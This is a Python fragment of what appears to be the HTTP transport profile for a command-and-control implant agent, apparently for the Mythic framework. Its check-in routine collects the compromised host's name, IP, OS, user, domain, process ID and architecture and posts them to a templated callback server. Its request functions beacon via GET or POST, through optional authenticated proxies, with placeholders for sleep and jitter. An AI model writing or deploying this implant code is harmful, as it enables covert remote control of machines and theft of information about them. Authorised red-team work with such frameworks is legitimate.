### IMPORTS ###
import urllib.request

### CLASS_FIELDS ###

### FUNCTIONS ###
    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        response_data = self.postMessageAndRetrieveResponse(data)
        if("status" in response_data):
            UUID = response_data["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        #CERTSKIP
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

### CONFIG ###
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "Headers": HEADER_PLACEHOLDER,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
